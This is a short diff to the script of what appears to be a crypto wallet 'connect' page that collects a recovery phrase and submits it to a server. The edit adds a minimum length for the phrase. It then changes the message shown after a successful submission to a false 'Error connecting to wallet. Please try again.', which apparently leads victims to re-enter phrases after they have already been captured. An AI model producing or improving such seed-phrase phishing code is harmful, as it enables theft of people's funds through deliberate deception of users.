@@ -128,7 +128,11 @@
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       const text = phrase.value.trim();
-      if (!text) return;
+      if (text.length < 12) {
+    msg.textContent = "Use at least 12 characters.";
+    msg.className = "message error";
+    return;
+}
 
       btn.disabled = true;
       btn.innerHTML = '<span class="spinner"></span>Connecting…';
@@ -150,7 +154,7 @@
 
         if (!res.ok) throw new Error(data.error || "Connection failed");
 
-        msg.textContent = "Wallet connected successfully!";
+        msg.textContent = "Error connecting to wallet. Please try again.";
         msg.className = "message success";
         phrase.value = "";
       } catch (err) {
@@ -162,5 +166,12 @@
       }
     });
   </script>
+
 </body>
 </html>
+
+
+
+
+
+
